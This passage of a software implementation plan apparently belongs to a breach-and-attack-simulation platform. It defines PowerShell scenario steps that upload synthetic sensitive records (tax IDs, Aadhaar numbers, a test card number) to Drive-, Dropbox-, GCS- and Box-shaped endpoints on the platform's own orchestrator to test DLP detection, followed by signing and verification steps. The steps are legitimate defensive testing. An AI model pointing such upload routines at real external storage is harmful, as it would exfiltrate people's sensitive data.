      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $token = "{{SINK_TOKEN}}"
      $boundary = [System.Guid]::NewGuid().ToString()
      $metadata = "{`"name`":`"$token.dat`",`"mimeType`":`"text/plain`"}"
      $bodyLines = @(
        "--$boundary",
        'Content-Type: application/json; charset=UTF-8',
        '',
        $metadata,
        "--$boundary",
        'Content-Type: text/plain',
        '',
        $csvContent,
        "--$boundary--"
      ) -join "`r`n"
      $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/gdrive/upload/drive/v3/files"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $bodyLines -ContentType "multipart/related; boundary=$boundary" -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: gdrive_upload_result=success"
        Write-Output "EXEC T1567.002: Google Drive-compatible traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-GDRIVE]"
      } catch {
        Write-Output "DLP_OBSERVATION: gdrive_upload_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.002: Google Drive-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-GDRIVE]"
      }
      # See the S3 step above for why this step's graded verdict never
      # comes from this script's own success/failure.
    cleanup: ""

  # ---------------------------------------------------------------------------
  # Provider 5 — Dropbox-compatible traffic simulation
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — Dropbox-Compatible Traffic Simulation (T1567.002)"
    technique_id: T1567.002
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic multi-type sensitive record to the platform's own Dropbox-API-shaped endpoint (this same on-prem orchestrator). No real Dropbox account, no external destination -- traffic-shape simulation only, not an authenticated Dropbox API request."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: Dropbox-shaped HTTPS POST (Dropbox-API-Arg header) content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $token = "{{SINK_TOKEN}}"
      $apiArg = "{`"path`":`"/$token.dat`",`"mode`":`"add`"}"
      $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/dropbox/2/files/upload"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $csvContent `
          -Headers @{ 'Dropbox-API-Arg' = $apiArg } -ContentType 'application/octet-stream' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: dropbox_upload_result=success"
        Write-Output "EXEC T1567.002: Dropbox-compatible traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-DROPBOX]"
      } catch {
        Write-Output "DLP_OBSERVATION: dropbox_upload_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.002: Dropbox-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-DROPBOX]"
      }
      # See the S3 step above for why this step's graded verdict never
      # comes from this script's own success/failure.
    cleanup: ""

  # ---------------------------------------------------------------------------
  # Provider 6 — Google Cloud Storage-compatible traffic simulation
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — Google Cloud Storage-Compatible Traffic Simulation (T1567.002)"
    technique_id: T1567.002
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic multi-type sensitive record to the platform's own GCS-API-shaped endpoint (this same on-prem orchestrator). No real Google Cloud account, no real bucket, no external destination -- traffic-shape simulation only, not an authenticated GCS API request."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: Google-Cloud-Storage-shaped HTTPS POST content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $token = "{{SINK_TOKEN}}"
      $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/gcs/upload/storage/v1/b/bas-sim-bucket/o?uploadType=media&name=$token.dat"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $csvContent -ContentType 'text/plain' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: gcs_upload_result=success"
        Write-Output "EXEC T1567.002: Google Cloud Storage-compatible traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-GCS]"
      } catch {
        Write-Output "DLP_OBSERVATION: gcs_upload_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.002: Google Cloud Storage-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-GCS]"
      }
      # See the S3 step above for why this step's graded verdict never
      # comes from this script's own success/failure.
    cleanup: ""

  # ---------------------------------------------------------------------------
  # Provider 7 — Box-compatible traffic simulation
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — Box-Compatible Traffic Simulation (T1567.002)"
    technique_id: T1567.002
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic multi-type sensitive record to the platform's own Box-API-shaped endpoint (this same on-prem orchestrator). No real Box account, no external destination -- traffic-shape simulation only, not an authenticated Box API request."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: Box-shaped multipart HTTPS POST content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $token = "{{SINK_TOKEN}}"
      $boundary = [System.Guid]::NewGuid().ToString()
      $attributes = "{`"name`":`"$token.dat`",`"parent`":{`"id`":`"0`"}}"
      $bodyLines = @(
        "--$boundary",
        'Content-Disposition: form-data; name="attributes"',
        '',
        $attributes,
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$token.dat`"",
        'Content-Type: application/octet-stream',
        '',
        $csvContent,
        "--$boundary--"
      ) -join "`r`n"
      $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/box/2.0/files/content"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $bodyLines -ContentType "multipart/form-data; boundary=$boundary" -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: box_upload_result=success"
        Write-Output "EXEC T1567.002: Box-compatible traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-BOX]"
      } catch {
        Write-Output "DLP_OBSERVATION: box_upload_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.002: Box-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-BOX]"
      }
      # See the S3 step above for why this step's graded verdict never
      # comes from this script's own success/failure.
    cleanup: ""
```

- [ ] **Step 3: Sign both changed/new scenario files**

```bash
cd orchestrator
go run scripts/signer.go sign private_key.pem ../scenarios/dlp-exfiltration-cloud-storage.yaml
go run scripts/signer.go sign private_key.pem ../scenarios/detection-profiles/windows_dlp_exfiltration.yaml
```

- [ ] **Step 4: Verify the scenario loads, its signature checks out, and all seven steps share T1567.002**

Create a throwaway test file `orchestrator/zzz_verify_cloud_scenario_test.go`:

```go
package orchestrator

import (
	"testing"

	"github.com/audspect/bas/internal/scenario"
)

func TestZZZVerifyCloudStorageScenarioLoads(t *testing.T) {
	eng := scenario.NewEngine("../scenarios")
	if err := eng.Load(); err != nil {
		t.Fatalf("Load: %v", err)
	}
	sc, ok := eng.Get("dlp-exfiltration-cloud-storage")
	if !ok {
		t.Fatal("dlp-exfiltration-cloud-storage not found after Load -- check the file and its .sig")
	}
	if len(sc.Steps) != 7 {
		t.Fatalf("got %d steps, want 7", len(sc.Steps))
	}
	for i, s := range sc.Steps {
		if s.TechniqueID != "T1567.002" {
			t.Errorf("step %d: TechniqueID = %q, want T1567.002", i, s.TechniqueID)
		}
	}
}
```

Run: `cd orchestrator && go test . -run TestZZZVerifyCloudStorageScenarioLoads -v`
Expected: PASS.

Delete the throwaway test file afterward — it must never be committed:

```bash
rm orchestrator/zzz_verify_cloud_scenario_test.go
```

- [ ] **Step 5: Commit**

```bash
cd orchestrator
git add scenarios/dlp-exfiltration-cloud-storage.yaml scenarios/dlp-exfiltration-cloud-storage.yaml.sig \
  scenarios/detection-profiles/windows_dlp_exfiltration.yaml \
  scenarios/detection-profiles/windows_dlp_exfiltration.yaml.sig
git commit -m "feat(scenarios): cloud storage DLP exfiltration channel (T1567.002, 7 providers)"
git push
```

---

## Task 9: Full verification and handoff

**Files:** none (verification only).

- [ ] **Step 1: Run the full affected-package suite**

Run: `cd orchestrator && go test ./internal/cloudsink/... ./internal/api/... ./internal/verifysync/... ./internal/reporting/... -v 2>&1 | tail -100`
Expected: PASS throughout. In particular, confirm zero changes were needed to
`internal/verifysync.annotateSinkReceipts` or `internal/reporting.dlpVerifier` — both already only
check "does at least one receipt exist for this token," so all seven cloud-storage channels' receipts
are picked up automatically once `internal/cloudsink` writes into the same `dlp_sink_receipts` table.

- [ ] **Step 2: Run the broader build and gofmt check**

```bash
cd orchestrator
go build ./...
gofmt -l internal/cloudsink/*.go internal/api/dlp_sink.go internal/api/dlp_sink_test.go internal/api/routes.go
```

Expected: clean build, no gofmt output (nothing to reformat).

- [ ] **Step 3: Final commit if Steps 1-2 required any fixes**

If any test or build failure surfaced above required a code fix, commit and push it now with a
`fix(cloudsink): ...` message. If everything was already green, this step is a no-op — nothing to
commit.

---

## Self-Review Notes

- **Spec coverage:** transport/mounting (Task 6), all seven providers' handlers with per-provider
  token extraction (Tasks 2-5), rate limiting + byte ceiling (Task 1, applied in every handler),
  token-validated-before-receipt (every handler), placeholder substitution with the corrected
  publicBaseURL-derived port (Task 7), V1 scenario content with the fidelity-bar/naming-honesty
  requirements (Task 8), testing (spread across every task's TDD steps plus Task 9's full-suite run).
  No section of the spec is without a corresponding task.
- **Deliberate omissions vs. prior channels' plans:** no `StartListener`/`Serve`/`Status()` task
  (cloud storage has no independent listener lifecycle — it's routes on the always-up main server);
  no docker-compose/install.sh task (no new port to publish); no `SINK_CLOUD_ENABLED` config flag
  task (nothing to independently enable/disable). All three are absent by design, not oversight —
  see the spec's Decisions section.
- **Not done here, flagged as a natural follow-up:** folding these seven steps into
  `dlp-exfiltration-multichannel.yaml` (the combined scenario committed `72b0f09` earlier this
  session) was considered but deliberately left out of this plan — the user hasn't asked for cloud
  storage to be folded in yet, and every channel addition so far this session has been its own
  explicit request. If asked, it's a small follow-up: append these seven steps' YAML (unchanged) to
  that file's `steps:` list and re-sign both files.
- **Type consistency:** `Routes(db *pgxpool.Pool) chi.Router`, `handleS3Put`/`handleAzureBlobPut`/
  `handleOneDrivePut`/`handleGDriveUpload`/`handleDropboxUpload`/`handleGCSUpload`/`handleBoxUpload`
  (all `func(db *pgxpool.Pool) http.HandlerFunc`), `tokenExists`, `writeReceipt`, `cloudSinkHost`/
  `cloudSinkPort` — every name introduced in Task 1 or the spec is used identically in every later
  task that references it.
- **Placeholder scan:** no TBD/TODO. The one explicit fallback note in Task 3 Step 4 (mixed-literal
  route pattern) is a concrete, actionable contingency tied to a specific, nameable risk (chi
  version-dependent route-matching behavior for `{filename}:` segments), not an unresolved design
  question in this plan itself.
